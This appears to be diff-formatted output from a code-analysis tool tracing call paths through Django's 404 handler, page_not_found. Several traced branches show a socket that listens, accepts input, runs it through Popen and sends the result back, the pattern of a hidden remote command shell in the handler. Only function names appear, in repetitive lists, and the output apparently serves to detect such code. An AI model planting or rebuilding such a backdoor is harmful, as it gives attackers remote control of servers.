+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+
+id:58 line[45] parents: [56] : "\n    Default 404 handler.\n\n    Templates: :template:`404.html`\n    Context:\n        request_path\n            The path of the requested URL (e.g., '/app/pages/bad_page/'). It's\n            quoted to prevent a content injection attack.\n        exception\n            The message from the exception which triggered the 404 (if one was\n            supplied), or the exception class name\n    "
+Children:  [id:59 line[46] parents: [58] : exception_repr = exception.__class__.__name__]
+Calls:  []
+routes
+[]
+Branches
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+biglist
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+
+id:56 line[32] parents: [] : enter: page_not_found(request, exception, template_name)
+Children:  [id:58 line[45] parents: [56] : "\n    Default 404 handler.\n\n    Templates: :template:`404.html`\n    Context:\n        request_path\n            The path of the requested URL (e.g., '/app/pages/bad_page/'). It's\n            quoted to prevent a content injection attack.\n        exception\n            The message from the exception which triggered the 404 (if one was\n            supplied), or the exception class name\n    "]
+Calls:  []
+routes
+[]
+Branches
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+biglist
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound']
+['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound']
+['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound']
+['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound']
+['gethostname', 'gethostbyname', 'HttpResponseNotFound']
+['HttpResponseNotFound']
